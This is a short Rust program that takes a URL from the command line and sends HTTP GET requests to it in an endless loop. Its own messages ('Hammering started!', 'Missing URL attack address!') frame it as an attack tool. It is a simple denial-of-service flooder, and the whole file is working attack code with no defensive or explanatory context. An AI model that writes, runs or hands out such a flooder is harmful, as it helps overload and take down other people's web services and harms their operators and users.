use std::env;

fn send_pkg(url: &String) {
    let _result = reqwest::blocking::get(url);
}

fn hammer(url: &String) {
    println!("Hammering started!");
    loop { send_pkg(&url) }
}

fn main() {
    let args: Vec<_> = env::args().collect();
    let url = args.get(1);

    match url {
        Some(x) => hammer(&x),
        None    => println!("Missing URL attack address!")
    }

}
